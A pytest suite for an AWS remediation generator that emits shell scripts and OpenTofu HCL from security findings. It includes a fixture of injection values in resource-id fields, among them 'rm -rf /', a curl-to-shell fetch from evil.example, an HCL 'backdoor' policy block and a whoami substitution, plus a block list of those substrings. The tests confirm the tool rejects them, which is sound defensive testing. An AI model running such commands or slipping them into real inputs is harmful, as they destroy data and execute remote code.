"""End-to-end CLI tests, including the shell/HCL validity of real output.

Where the tools are available, generated artifacts are checked with the actual
parsers -- ``bash -n`` and ``tofu``. Asserting on substrings only would not catch
output that reads correctly and does not parse.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess

import pytest

from remgen.core.model import SafetyTier
from remgen.providers.aws.cli import main
from remgen.providers.aws.recipes import all_recipes

from .conftest import PROVIDER_TF, TOFU

GOOD = {
    "cloudtrail": {
        "policyId": "8d1140ba-c917-44d7-b2ea-084f9dffe707",
        "resourceId": "my-org-trail",
        "region": "us-east-1",
        "accountId": "123456789012",
    },
    "s3": {
        "policyId": "284b1210-a31e-48ce-97af-f4d825ef132d",
        "resourceId": "acme-prod-assets",
        "region": "us-west-2",
        "accountId": "123456789012",
    },
    "rds": {
        "policyId": "4d6662cd-9f34-41eb-b152-f24c692d4fbf",
        "resourceId": "prod-postgres-01",
        "region": "eu-west-1",
        "accountId": "999988887777",
    },
    "kms": {
        "policyId": "995e8d78-940a-45bf-bac1-61a1fdb00d7a",
        "resourceId": "1234abcd-12ab-34cd-56ef-1234567890ab",
        "region": "us-east-1",
        "accountId": "123456789012",
    },
    "dynamodb": {
        "policyId": "468d7976-445f-44c2-b9fb-45fb1005f373",
        "resourceId": "GameScores",
        "region": "us-east-1",
        "accountId": "123456789012",
    },
    # Public RDS Snapshot: the CLI-only recipe, and it is in this fixture on purpose.
    # `--format hcl` must say how many findings it could not express, and that message
    # is computed from the *selected* recipes rather than from the whole catalogue -- so
    # a fixture with no CLI-only finding made the assertion pass without the message
    # ever being printed. It did pass that way, silently, for as long as every AWS
    # recipe had an HCL half.
    "rds-snapshot": {
        "policyId": "b03ad608-ad17-4165-95bd-3611db4f2185",
        "resourceId": "prod-postgres-01-final-snapshot",
        "region": "eu-west-1",
        "accountId": "999988887777",
    },
}

#: The subset of :data:`GOOD` whose recipe can be expressed as configuration. Tests
#: that count `import` or `resource` blocks must use this rather than ``len(GOOD)``:
#: a CLI-only recipe contributes a shell command and no HCL, so the two counts are no
#: longer the same number. Derived from the recipes rather than hardcoded, so adding
#: another CLI-only fixture entry cannot leave a stale literal behind.
GOOD_WITH_HCL = {
    key: record
    for key, record in GOOD.items()
    if any(r.policy_id == record["policyId"] and r.hcl is not None for r in all_recipes())
}

#: Injection attempts. None of these substrings may appear in any artifact.
MALICIOUS = [
    {
        "policyId": "8d1140ba-c917-44d7-b2ea-084f9dffe707",
        "resourceId": "trail; rm -rf /",
        "region": "us-east-1",
        "accountId": "1",
    },
    {
        "policyId": "8d1140ba-c917-44d7-b2ea-084f9dffe707",
        "resourceId": "$(curl evil.example/x|sh)",
        "region": "us-east-1",
        "accountId": "1",
    },
    {
        "policyId": "284b1210-a31e-48ce-97af-f4d825ef132d",
        "resourceId": 'b"\nresource "aws_iam_role_policy" "backdoor" {',
        "region": "us-east-1",
        "accountId": "1",
    },
    {
        "policyId": "284b1210-a31e-48ce-97af-f4d825ef132d",
        "resourceId": "bucket`whoami`",
        "region": "us-east-1",
        "accountId": "1",
    },
]

#: Substrings unique to the injection attempts above. Deliberately excludes
#: characters that legitimately appear in the artifacts' own explanatory prose
#: (backticks quote `tofu plan`, and "resource" appears throughout), so a failure
#: here means a finding value actually leaked.
INJECTED_SUBSTRINGS = ["rm -rf", "curl evil", "whoami", "backdoor", "`whoami`"]

#: The only command substitution the generator is permitted to emit: the account
#: guard in the script header. Checked as an exact allowlist rather than dropping
#: "$(" from the blocklist above, because command substitution is precisely what an
#: injected resource id would produce -- so its presence must stay accounted for,
#: not merely tolerated.
ALLOWED_SUBSTITUTION = (
    'actual_account="$(aws sts get-caller-identity --query Account --output text)"'
)


@pytest.fixture
def env(tmp_path, monkeypatch, capsys):
    monkeypatch.setenv("REMGEN_CACHE_DIR", str(tmp_path / "cache"))
    return tmp_path


def _write(path, records):
    path.write_text(json.dumps(records), encoding="utf-8")
    return path


def _run(argv):
    return main(argv)


# Output is split per cloud, per account, and per region for HCL, so tests locate
# artifacts by extension anywhere under the output directory rather than by a fixed
# filename or a fixed depth. See remgen.core.layout for the rules.


def _scripts(out):
    return sorted(out.rglob("*.sh"))


def _tfs(out):
    return sorted(out.rglob("*.tf"))


def _joined(out, ext):
    """Concatenate every artifact of one type, for whole-output assertions."""
    return "\n".join(p.read_text(encoding="utf-8") for p in sorted(out.rglob(f"*{ext}")))


# ---------------------------------------------------------------------------
# generate
# ---------------------------------------------------------------------------


def test_generate_writes_both_artifacts(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    out = env / "art"
    assert _run(["generate", "--findings", str(findings), "--out", str(out)]) == 0
    assert _scripts(out)
    assert _tfs(out)
    captured = capsys.readouterr().out
    assert "made no AWS changes" in captured


def test_generate_defaults_to_safest_level_and_says_what_it_withheld(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    _run(["generate", "--findings", str(findings), "--out", str(env / "art")])
    captured = capsys.readouterr().out
    # A silent cap would read as "nothing more to do".
    assert "Withheld by safety level" in captured
    assert "--safety-level caution" in captured


def test_artifact_sections_run_least_to_most_risky(env, capsys):
    """A reader meets the safe changes first and the risky ones last.

    Every artifact is ordered by ``SafetyTier.rank`` -- the same ordering the HCL
    generator uses to file a merged block under the riskiest of its contributors.
    Reversed or flattened, each artifact still contains every section and every
    remediation, so no count and no substring assertion in this suite changes, while a
    user skimming the top of the file now leads with the changes they should be most
    reluctant to run.
    """
    findings = _write(env / "f.json", list(GOOD.values()))
    assert (
        _run(
            [
                "generate",
                "--findings",
                str(findings),
                "--out",
                str(env / "art"),
                "--safety-level",
                "all",
            ]
        )
        == 0
    )
    capsys.readouterr()  # drain, so a later test's assertions see only its own output

    for suffix in (".sh", ".tf"):
        body = _joined(env / "art", suffix)
        # The banner text starts with the tier name in upper case; see
        # generators.common.tier_banner.
        positions = [(body.find(t.value.upper()), t) for t in SafetyTier]
        present = [(i, t) for i, t in positions if i >= 0]
        assert len(present) >= 2, (
            f"fewer than two tiers appear in the {suffix} artifacts, so the ordering "
            f"below is vacuous. Found {[t.value for _, t in present]}."
        )
        assert present == sorted(present, key=lambda p: p[1].rank), (
            f"{suffix} sections are not ordered least-to-most risky: "
            f"{[t.value for _, t in present]}"
        )


def test_safety_level_all_includes_more_remediations(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    _run(["generate", "--findings", str(findings), "--out", str(env / "safe")])
    safe_out = capsys.readouterr().out
    _run(
        [
            "generate",
            "--findings",
            str(findings),
            "--out",
            str(env / "all"),
            "--safety-level",
            "all",
        ]
    )
    all_out = capsys.readouterr().out

    safe_script = _joined(env / "safe", ".sh")
    all_script = _joined(env / "all", ".sh")
    assert all_script.count("aws ") > safe_script.count("aws ")
    assert "Withheld by safety level" not in all_out
    assert "Withheld by safety level" in safe_out


def test_a_recipe_conflict_exits_6_and_writes_nothing_at_all(env, capsys, monkeypatch):
    """Exit 6 must leave no artifacts, not a half-written set.

    The shell script is rendered *before* the HCL, so a naive handler would leave a
    directory holding a `.sh` and no `.tf` -- which reads as "this cloud has no IaC
    equivalent", a state the tool produces legitimately for recipes without an HCL
    target. A user would apply the script believing the run succeeded.

    Forced with a monkeypatched conflicting recipe pair rather than a real one,
    because no two shipped recipes overlap -- and if one ever does, the set-level test
    in ``test_recipe_set.py`` fails instead, which is the right place for it.
    """
    import remgen.core.cli as core_cli
    from remgen.core.model import ApiCall, HclTarget, Recipe

    real = get_recipe_for("284b1210-a31e-48ce-97af-f4d825ef132d")
    assert real is not None and real.hcl is not None

    def _conflicting(suffix, value):
        return Recipe(
            policy_id=f"{real.policy_id[:-1]}{suffix}",
            policy_title=f"Conflicting {suffix}",
            summary="s",
            api=ApiCall(service="s3", operation="PutBucketVersioning", parameters=("Bucket",)),
            cli_template="aws s3api put-bucket-versioning --bucket {resource_id}",
            hcl=HclTarget(
                resource_type=real.hcl.resource_type,
                attributes=(("bucket", value),),
                import_id_template=real.hcl.import_id_template,
            ),
            reverse_hint="undo",
        )

    a = _conflicting("a", '"{resource_id}"')
    b = _conflicting("b", '"a-different-bucket"')
    conflicting = {a.policy_id: a, b.policy_id: b}
    monkeypatch.setattr(core_cli, "_pair_findings", _pairs_for(core_cli, conflicting), raising=True)

    findings = _write(
        env / "f.json",
        [
            {
                "policyId": pid,
                "resourceId": "shared-bucket",
                "region": "us-east-1",
                "accountId": "123456789012",
            }
            for pid in conflicting
        ],
    )
    out = env / "art"
    assert _run(["generate", "--findings", str(findings), "--out", str(out)]) == 6

    err = capsys.readouterr().err
    assert "disagree" in err, f"the error did not say what went wrong: {err!r}"
    assert "awsremgen" in err, "the error did not say this is a defect in the tool"
    assert not _scripts(out), "a shell script was written despite the run failing"
    assert not _tfs(out), "HCL was written despite the run failing"


def test_a_filename_that_escapes_the_output_directory_exits_6_and_writes_nothing(
    env, capsys, monkeypatch
):
    """The containment check before each write must not be dead code.

    ``Finding`` now rejects a hostile ``account_id`` or ``region`` outright, so no
    input can reach this branch -- which is exactly why it needs its own test. A
    defence-in-depth check that nothing exercises is indistinguishable from a
    deleted one, and the comment beside it would go on claiming a guarantee that had
    quietly stopped holding.

    The escape is injected by overriding ``OutputUnit.filename`` rather than through
    a finding, because the hazard this branch exists for is the one the validators
    cannot see: a *future* filename component that nobody re-validated. That is the
    scenario simulated here, and it is the only way to reach the line at all.

    Two ``..`` segments, not one: artifacts are written under a per-cloud directory,
    so a single ``..`` lands beside it and is still inside ``--out``. The check
    permits that, correctly -- the boundary being defended is the output directory,
    not the cloud subdirectory -- and a one-segment payload would make this test
    pass for the wrong reason if the check were later removed.
    """
    from remgen.core.layout import OutputUnit

    real_filename = OutputUnit.filename.fget
    monkeypatch.setattr(
        OutputUnit,
        "filename",
        property(lambda self: f"../../escaped-{real_filename(self)}"),
        raising=True,
    )

    findings = _write(env / "f.json", list(GOOD.values()))
    out = env / "art"
    assert _run(["generate", "--findings", str(findings), "--out", str(out)]) == 6

    err = capsys.readouterr().err
    assert "outside the output directory" in err, f"the error did not say why: {err!r}"
    assert "awsremgen" in err, "the error did not say this is a defect in the tool"
    # The escaped name resolves into `env`, the parent of `out`. Nothing may be
    # there: returning 6 after writing the file would report a failure and still
    # have done the thing.
    escaped = sorted(p.name for p in env.iterdir() if p.name.startswith("escaped-"))
    assert not escaped, f"wrote outside the output directory anyway: {escaped}"
    assert not _scripts(out) and not _tfs(out), "a partial artifact set was left behind"


def _pairs_for(core_cli, recipes):
    """Return a ``_pair_findings`` that resolves ids from ``recipes``.

    Wraps the real function so only recipe *lookup* is substituted; the sort, the
    unmatched split and everything downstream stay under test.
    """
    real_pair = core_cli._pair_findings

    def pair(findings, provider):
        import dataclasses

        return real_pair(findings, dataclasses.replace(provider, get_recipe=recipes.get))

    return pair


def get_recipe_for(policy_id):
    return next((r for r in all_recipes() if r.policy_id == policy_id), None)


def test_generate_reports_unsupported_policies(env, capsys):
    findings = _write(
        env / "f.json",
        [
            GOOD["cloudtrail"],
            {
                "policyId": "0252a65d-7538-463b-831c-5acf983e4c76",
                "resourceId": "my-api",
                "region": "us-east-1",
                "accountId": "1",
            },
        ],
    )
    _run(["generate", "--findings", str(findings), "--out", str(env / "art")])
    captured = capsys.readouterr().out
    assert "No recipe available" in captured
    assert "intentionally partial" in captured


def test_generate_counts_reconcile(env, capsys):
    records = list(GOOD.values()) + MALICIOUS + ["not-an-object"]
    findings = _write(env / "f.json", records)
    _run(["generate", "--findings", str(findings), "--out", str(env / "art")])
    captured = capsys.readouterr().out
    assert f"Records read:         {len(records)}" in captured
    assert f"rejected:           {len(MALICIOUS) + 1}" in captured


def test_generate_with_no_findings_is_not_an_error(env, capsys):
    findings = _write(env / "f.json", [])
    assert _run(["generate", "--findings", str(findings), "--out", str(env / "art")]) == 0
    assert "Nothing to generate" in capsys.readouterr().out


def test_generate_missing_file_exits_nonzero(env, capsys):
    code = _run(["generate", "--findings", str(env / "nope.json"), "--out", str(env / "art")])
    assert code == 2
    assert "error:" in capsys.readouterr().err


def test_script_is_executable(env):
    findings = _write(env / "f.json", [GOOD["cloudtrail"]])
    _run(["generate", "--findings", str(findings), "--out", str(env / "art")])
    scripts = _scripts(env / "art")
    assert scripts
    assert all(p.stat().st_mode & 0o111 for p in scripts)


# ---------------------------------------------------------------------------
# --safety-level
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("level", ["safest", "caution", "all"])
def test_each_safety_level_is_a_superset_of_the_safer_ones(env, capsys, level):
    """The levels are cumulative, so raising one never removes a remediation.

    "I accept irreversible changes" does not mean "and not the safe ones". A
    non-cumulative level would drop safe fixes the moment a user opted into risky
    ones, which is the opposite of what the flag reads as.
    """
    findings = _write(env / "f.json", list(GOOD.values()))
    _run(
        [
            "generate",
            "--findings",
            str(findings),
            "--out",
            str(env / level),
            "--safety-level",
            level,
        ]
    )
    capsys.readouterr()
    written = _joined(env / level, ".sh")
    safest = None
    if level != "safest":
        _run(["generate", "--findings", str(findings), "--out", str(env / "base")])
        capsys.readouterr()
        safest = _joined(env / "base", ".sh")
    if safest is not None:
        # Every command the safest run emitted must still be present.
        for line in (ln for ln in safest.splitlines() if ln.startswith("aws ")):
            assert line in written, f"raising the level dropped: {line}"


def test_an_unknown_safety_level_is_rejected_by_the_parser(env, capsys):
    # argparse choices, so the error names the accepted values rather than silently
    # falling back to a default the user did not ask for.
    findings = _write(env / "f.json", list(GOOD.values()))
    with pytest.raises(SystemExit) as exc:
        _run(
            [
                "generate",
                "--findings",
                str(findings),
                "--out",
                str(env / "art"),
                "--safety-level",
                "reckless",
            ]
        )
    assert exc.value.code == 2
    assert "safest" in capsys.readouterr().err


def test_help_lists_both_new_flags_and_names_the_command(capsys):
    # --help is the only documentation a user reaches without leaving the terminal.
    with pytest.raises(SystemExit):
        main(["generate", "--help"])
    out = capsys.readouterr().out
    assert "awsremgen" in out
    assert "--format" in out
    assert "--safety-level" in out
    # The old spelling must be gone, not aliased: two spellings for one setting
    # invites passing both and guessing precedence.
    assert "--tier" not in out


# ---------------------------------------------------------------------------
# --format
# ---------------------------------------------------------------------------


def test_default_writes_both_formats(env):
    # Complementary rather than alternative: the script for a one-off fix, the HCL
    # for resources already under IaC. Defaulting to one would silently withhold the
    # other from a user who never read the flag.
    findings = _write(env / "f.json", list(GOOD.values()))
    out = env / "art"
    assert _run(["generate", "--findings", str(findings), "--out", str(out)]) == 0
    assert _scripts(out)
    assert _tfs(out)


@pytest.mark.parametrize(
    ("value", "want_sh", "want_tf"),
    [
        ("cli", True, False),
        ("hcl", False, True),
        ("all", True, True),
        ("cli,hcl", True, True),
        # Order must not matter: the same request spelled two ways is one run.
        ("hcl,cli", True, True),
        # Tolerated so a value pasted from a shell with spacing still works.
        (" CLI , hcl ", True, True),
    ],
)
def test_format_selects_exactly_what_was_asked_for(env, value, want_sh, want_tf):
    findings = _write(env / "f.json", list(GOOD.values()))
    out = env / "art"
    assert (
        _run(["generate", "--findings", str(findings), "--out", str(out), "--format", value]) == 0
    )
    assert bool(_scripts(out)) is want_sh
    assert bool(_tfs(out)) is want_tf


@pytest.mark.parametrize("value", ["", "cli,", "sdk", "cli,sdk", ",", "terraform"])
def test_an_unknown_format_is_an_error_not_a_silent_omission(env, capsys, value):
    """A typo must fail rather than emit less.

    Accepting ``--format cli,tf`` and quietly writing only the script produces a run
    that looks complete and is missing half its output -- indistinguishable, to the
    reader, from a tool that found nothing to fix.
    """
    findings = _write(env / "f.json", list(GOOD.values()))
    out = env / "art"
    code = _run(["generate", "--findings", str(findings), "--out", str(out), "--format", value])
    captured = capsys.readouterr()
    assert code == 2
    assert "--format" in captured.err
    assert "Traceback" not in captured.err + captured.out
    # Nothing was written, so a failed run leaves no partial output to mistake for a
    # complete one.
    assert not out.exists() or not (_scripts(out) + _tfs(out))


def test_format_is_reported_in_the_summary(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    _run(
        [
            "generate",
            "--findings",
            str(findings),
            "--out",
            str(env / "art"),
            "--format",
            "cli",
        ]
    )
    assert "Formats: cli" in capsys.readouterr().out


def test_hcl_only_reports_the_remediations_it_could_not_express(env, capsys):
    """Selecting HCL alone drops CLI-only policies, so the count must be stated.

    Some policies have no IaC equivalent. Writing nothing for them and saying nothing
    would report a successful run that silently skipped findings it had a recipe for.

    The message is computed from the recipes actually *selected* for these findings, not
    from the catalogue, so the fixture has to contain a CLI-only finding for this to
    assert anything -- see ``GOOD["rds-snapshot"]``. Asserted here rather than assumed,
    because for as long as every AWS recipe had an HCL half this test passed by taking
    the other branch and never checked the message at all.
    """
    findings = _write(env / "f.json", list(GOOD.values()))
    _run(
        [
            "generate",
            "--findings",
            str(findings),
            "--out",
            str(env / "art"),
            "--format",
            "hcl",
            "--safety-level",
            "all",
        ]
    )
    out = capsys.readouterr().out
    selected_cli_only = {
        record["policyId"] for key, record in GOOD.items() if key not in GOOD_WITH_HCL
    }
    assert selected_cli_only, (
        "GOOD contains no CLI-only finding, so the branch below cannot be reached and "
        "this test would report success without the message being printed once"
    )
    assert "no IaC equivalent" in out
    assert str(len(selected_cli_only)) in out, (
        f"the count of dropped remediations is missing from:\n{out}"
    )


def test_hcl_only_does_not_mention_todo_placeholders_for_output_it_did_not_write(env, capsys):
    findings = _write(env / "f.json", list(GOOD.values()))
    _run(
        [
            "generate",
            "--findings",
            str(findings),
            "--out",
            str(env / "art"),
            "--format",
            "cli",
        ]
    )
    # There are no resource blocks in a script, so pointing the reader at TODOs sends
    # them looking for markers that are not there.
    assert "TODO placeholders" not in capsys.readouterr().out


# ---------------------------------------------------------------------------
# Output layout
# ---------------------------------------------------------------------------


def test_artifacts_are_written_under_a_per_cloud_directory(env):
    findings = _write(env / "f.json", list(GOOD.values()))
    out = env / "art"
    _run(["generate", "--findings", str(findings), "--out", str(out)])
    for path in _scripts(out) + _tfs(out):
        assert path.parent == out / "aws", f"{path} is not under the cloud directory"
    # The companion files stay at the top: one README and one index cover the run, so
    # a finding that produced no artifact is still reconcilable from a single place.
    assert (out / "README.md").is_file()
    assert (out / "manifest.json").is_file()


def test_manifest_paths_resolve_from_the_output_directory(env):
    findings = _write(env / "f.json", list(GOOD.values()))
    out = env / "art"
    _run(["generate", "--findings", str(findings), "--out", str(out)])
    manifest = json.loads((out / "manifest.json").read_text(encoding="utf-8"))
    assert manifest["clouds"] == ["aws"]
    for entry in manifest["files"]:
        assert (out / entry["path"]).is_file(), entry["path"]


# ---------------------------------------------------------------------------
# Injection resistance -- the highest-consequence property
# ---------------------------------------------------------------------------


def test_malicious_findings_never_reach_artifacts(env, capsys):
    findings = _write(env / "f.json", MALICIOUS + list(GOOD.values()))
    _run(
        [
            "generate",
            "--findings",
            str(findings),
            "--out",
            str(env / "art"),
            "--safety-level",
            "all",
        ]
    )
    captured = capsys.readouterr().out
    assert "rejected" in captured

    for path in _scripts(env / "art") + _tfs(env / "art"):
        text = path.read_text(encoding="utf-8")
        for needle in INJECTED_SUBSTRINGS:
            assert needle not in text, f"{needle!r} leaked into {path.name}"
        # Command substitution is what an injected resource id would produce, so
        # every occurrence must be one the generator intends.
        assert text.count("$(") == text.count(ALLOWED_SUBSTITUTION), (
            f"unexpected command substitution in {path.name}"
        )


def test_malicious_findings_are_reported_as_rejected(env, capsys):
    findings = _write(env / "f.json", MALICIOUS)
    _run(["generate", "--findings", str(findings), "--out", str(env / "art")])
    captured = capsys.readouterr().out
    assert f"{len(MALICIOUS)} input record(s) were rejected" in captured
    assert "Refusing to generate rather than escape" in captured


# ---------------------------------------------------------------------------
# Real-parser validation of generated artifacts
# ---------------------------------------------------------------------------


@pytest.mark.skipif(shutil.which("bash") is None, reason="bash not available")
def test_generated_script_parses_as_bash(env):
    findings = _write(env / "f.json", list(GOOD.values()) + MALICIOUS)
    _run(
        [
            "generate",
            "--findings",
            str(findings),
            "--out",
            str(env / "art"),
            "--safety-level",
            "all",
        ]
    )
    scripts = _scripts(env / "art")
    assert scripts
    for script in scripts:
        result = subprocess.run(  # noqa: S603
            [shutil.which("bash"), "-n", str(script)],
            capture_output=True,
            text=True,
        )
        assert result.returncode == 0, f"{script.name}: {result.stderr}"


@pytest.mark.skipif(shutil.which("bash") is None, reason="bash not available")
def test_empty_script_still_parses_as_bash(env):
    findings = _write(env / "f.json", [])
    _run(["generate", "--findings", str(findings), "--out", str(env / "art")])
    # An empty run must still emit a runnable script, not a truncated one.
    for script in _scripts(env / "art"):
        result = subprocess.run(  # noqa: S603
            [shutil.which("bash"), "-n", str(script)], capture_output=True, text=True
        )
        assert result.returncode == 0, result.stderr


def _tofu_check(tf_file, work, template=None):
    """Run the real ``fmt -check`` and ``validate`` against a generated .tf file.

    Substring assertions cannot catch output that reads correctly and does not
    parse, so the actual toolchain is the oracle here.

    ``template``, when given, is a session-initialized workspace whose ``.terraform``
    tree is reused instead of running ``init`` here -- see
    :func:`tests.conftest.tofu_workspace_template`. Falling back to a real ``init``
    when it is absent keeps this function correct on its own, so a caller that forgets
    the fixture gets a slow test rather than an unvalidated one.
    """
    work.mkdir(parents=True, exist_ok=True)
    shutil.copy(tf_file, work / "main.tf")
    (work / "provider.tf").write_text(PROVIDER_TF, encoding="utf-8")

    reused = False
    if template is not None:
        # symlinks=True: the tree is symlinks into the shared plugin cache, and
        # dereferencing them would copy 663 MB per workspace -- the exact cost this
        # avoids.
        shutil.copytree(template / ".terraform", work / ".terraform", symlinks=True)
        lock = template / ".terraform.lock.hcl"
        if lock.exists():
            shutil.copy(lock, work / ".terraform.lock.hcl")
        reused = True

    fmt = subprocess.run(  # noqa: S603
        [TOFU, "fmt", "-check", "-no-color", "main.tf"],
        cwd=work,
        capture_output=True,
        text=True,
    )
    assert fmt.returncode == 0, f"generated HCL is not canonically formatted:\n{fmt.stdout}"

    init = (
        None
        if reused
        else subprocess.run(  # noqa: S603
            [TOFU, "init", "-no-color", "-backend=false"],
            cwd=work,
            capture_output=True,
            text=True,
            timeout=600,
        )
    )
    if init is not None and init.returncode != 0:
        # A failed `init` used to skip. That was wrong in the case that matters: the
        # skipif above has already confirmed a binary is present, so reaching here
        # means the toolchain IS available and something else broke -- a bad provider
        # constraint in the generated file, a corrupted plugin cache, a registry
        # error. Skipping turned all of those into a green run that had validated
        # nothing, and because the skip happens at runtime rather than at collection,
        # CI's "assert nothing was skipped" gate could not see it either.
        #
        # Genuine offline development is the one case that deserves tolerance, and it
        # is opt-in and explicit rather than inferred from a failure whose cause is
        # unknown. `-o addopts=` is not needed: the variable is read here only.
        if os.environ.get("REMGEN_ALLOW_TOFU_INIT_FAILURE") == "1":
            pytest.skip(f"provider download unavailable (opted in): {init.stderr[-200:]}")
        raise AssertionError(
            f"`{TOFU} init` failed, so the generated HCL was never validated. A binary "
            f"is present -- this is a real failure, not an unavailable toolchain. Set "
            f"REMGEN_ALLOW_TOFU_INIT_FAILURE=1 to tolerate it while offline.\n"
            f"stdout:\n{init.stdout[-1000:]}\nstderr:\n{init.stderr[-1000:]}"
        )

    validate = subprocess.run(  # noqa: S603
        [TOFU, "validate", "-no-color"], cwd=work, capture_output=True, text=True
    )
    assert validate.returncode == 0, f"generated HCL failed validate:\n{validate.stdout}"


def _tofu_check_all(out, work_root, template=None):
    """Validate every generated .tf, each in its own workspace.

    One workspace per file, because that is how they are meant to be used: each
    file targets one account and region and expects a provider configured for it.
    Concatenating them into a single workspace would test a usage the tool
    explicitly does not produce.
    """
    files = _tfs(out)
    assert files, "no HCL was generated"
    for index, tf_file in enumerate(files):
        _tofu_check(tf_file, work_root / f"tf{index}", template)


@pytest.mark.skipif(TOFU is None, reason="neither tofu nor terraform available")
def test_generated_hcl_is_valid_and_formatted(env, tofu_workspace_template):
    findings = _write(env / "f.json", list(GOOD.values()) + MALICIOUS)
    _run(
        [
            "generate",
            "--findings",
            str(findings),
            "--out",
            str(env / "art"),
            "--safety-level",
            "all",
        ]
    )
    _tofu_check_all(env / "art", env / "work", tofu_workspace_template)


@pytest.mark.skipif(TOFU is None, reason="neither tofu nor terraform available")
def test_same_resource_name_in_two_accounts_still_validates(env, tofu_workspace_template):
    """The collision case, checked by the real parser rather than by substring.

    ``GameScores`` in dev and prod are two different tables, but both fold to the
    HCL label ``gamescores``. Two separate defects meet here. Before labels were
    assigned across the whole file, this emitted duplicate ``import`` and
    ``resource`` blocks and ``tofu validate`` failed with "Duplicate resource
    configuration" while the CLI reported success. Splitting by account fixes that
    a second way -- and fixes the worse problem underneath it, which is that a
    single provider cannot resolve imports in two accounts at all.
    """
    dev = dict(GOOD["dynamodb"], region="us-east-1", accountId="111111111111")
    prod = dict(GOOD["dynamodb"], region="us-west-2", accountId="222222222222")
    findings = _write(env / "f.json", [dev, prod])
    assert (
        _run(
            [
                "generate",
                "--findings",
                str(findings),
                "--out",
                str(env / "art"),
                "--safety-level",
                "all",
            ]
        )
        == 0
    )

    # One file per account, each with exactly one block, and no file naming both.
    files = _tfs(env / "art")
    assert len(files) == 2
    for path in files:
        text = path.read_text(encoding="utf-8")
        assert text.count("import {") == 1
        owner = "111111111111" if "111111111111" in path.name else "222222222222"
        other = "222222222222" if owner == "111111111111" else "111111111111"
        assert other not in text, f"{path.name} references another account"

    _tofu_check_all(env / "art", env / "work", tofu_workspace_template)


@pytest.mark.skipif(TOFU is None, reason="neither tofu nor terraform available")
def test_a_merged_block_validates_against_the_real_provider(env, tofu_workspace_template):
    """The merged output shape, checked by the real parser rather than by substring.

    Merging is the whole point of two recipes on one resource, and no shipped pair
    overlaps yet -- so without this, the new output shape has never been through a
    real parser and the substring tests in ``test_generators.py`` are the only oracle.
    They cannot catch a merged block that reads correctly and does not parse: a
    duplicated argument, a nested block emitted twice, an attribute the provider
    rejects on this resource type.

    Built from two *real* provider features on one real resource type
    (``aws_dynamodb_table``: ``deletion_protection_enabled`` from the shipped recipe,
    plus a ``point_in_time_recovery`` block), because a made-up ``aws_thing`` would
    validate nothing -- the provider has to recognise both.
    """
    import remgen.core.cli as core_cli
    from remgen.core.model import ApiCall, HclTarget, Recipe

    shipped = get_recipe_for("468d7976-445f-44c2-b9fb-45fb1005f373")
    assert shipped is not None and shipped.hcl is not None

    pitr = Recipe(
        policy_id="00000000-0000-0000-0000-0000000000pi",
        policy_title="DynamoDB point-in-time recovery is not enabled",
        summary="Enable PITR",
        api=ApiCall(
            service="dynamodb",
            operation="UpdateContinuousBackups",
            parameters=("TableName", "PointInTimeRecoverySpecification"),
        ),
        cli_template=(
            "aws dynamodb update-continuous-backups --table-name {resource_id} "
            "--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true"
        ),
        hcl=HclTarget(
            resource_type="aws_dynamodb_table",
            # `name` is set identically by the shipped recipe -- the merge must emit it
            # once. HCL rejects a duplicated argument, so this half the parser catches.
            attributes=(("name", '"{resource_id}"'),),
            import_id_template="{resource_id}",
            blocks=(("point_in_time_recovery", (("enabled", "true", ""),)),),
            unresolvable_required_attributes=(
                ("hash_key", '"TODO"', "TODO: set to the table's existing hash key"),
            ),
        ),
        reverse_hint="disable point-in-time recovery",
    )
    recipes = {shipped.policy_id: shipped, pitr.policy_id: pitr}
    monkeypatch_pairs = _pairs_for(core_cli, recipes)

    findings = _write(
        env / "f.json",
        [
            {
                "policyId": pid,
                "resourceId": "GameScores",
                "region": "us-east-1",
                "accountId": "123456789012",
            }
            for pid in recipes
        ],
    )
    original = core_cli._pair_findings
    core_cli._pair_findings = monkeypatch_pairs
    try:
        assert (
            _run(
                [
                    "generate",
                    "--findings",
                    str(findings),
                    "--out",
                    str(env / "art"),
                    "--safety-level",
                    "all",
                ]
            )
            == 0
        )
    finally:
        core_cli._pair_findings = original

    text = _joined(env / "art", ".tf")
    # One pair for the one table, carrying both policies' changes.
    assert text.count("import {") == 1, text
    assert text.count('resource "aws_dynamodb_table"') == 1, text
    assert text.count("point_in_time_recovery {") == 1, text
    assert "deletion_protection_enabled = true" in text
    assert text.count("name ") == 1 or text.count("\n  name") == 1, (
        f"`name` was emitted more than once; HCL rejects a duplicate argument:\n{text}"
    )

    # The oracle: real fmt -check and validate. A merged block that a substring test
    # accepts and the provider rejects fails here.
    _tofu_check_all(env / "art", env / "work", tofu_workspace_template)


@pytest.mark.skipif(TOFU is None, reason="neither tofu nor terraform available")
def test_every_recipe_pairs_one_import_with_one_resource(env):
    findings = _write(env / "f.json", list(GOOD.values()))
    _run(
        [
            "generate",
            "--findings",
            str(findings),
            "--out",
            str(env / "art"),
            "--safety-level",
            "all",
        ]
    )
    text = _joined(env / "art", ".tf")
    # A resource block without an import block would create a duplicate resource.
    assert text.count("import {") == text.count('\nresource "')
    # GOOD_WITH_HCL, not GOOD: the fixture includes a CLI-only finding, which is
    # expected to produce a shell command and no blocks at all.
    assert text.count("import {") == len(GOOD_WITH_HCL)
    assert len(GOOD_WITH_HCL) < len(GOOD), (
        "no CLI-only record left in GOOD, so this test no longer distinguishes "
        "'one import per HCL recipe' from 'one import per finding'"
    )


# ---------------------------------------------------------------------------
# policies
# ---------------------------------------------------------------------------


def test_policies_first_run_then_detects_new(env, capsys):
    catalog = env / "c.json"
    _write(catalog, [{"id": "1", "title": "Alpha", "category": "IAM"}])
    assert _run(["policies", "--catalog", str(catalog)]) == 0
    assert "first run" in capsys.readouterr().out

    _write(
        catalog,
        [
            {"id": "1", "title": "Alpha", "category": "IAM"},
            {"id": "2", "title": "Beta", "category": "Data"},
        ],
    )
    assert _run(["policies", "--catalog", str(catalog)]) == 0
    captured = capsys.readouterr().out
    assert "1 new policy" in captured
    assert "Beta" in captured


def test_no_save_leaves_snapshot_untouched(env, capsys):
    catalog = _write(env / "c.json", [{"id": "1", "title": "Alpha"}])
    _run(["policies", "--catalog", str(catalog)])
    capsys.readouterr()
    _write(catalog, [{"id": "1", "title": "Alpha"}, {"id": "2", "title": "Beta"}])
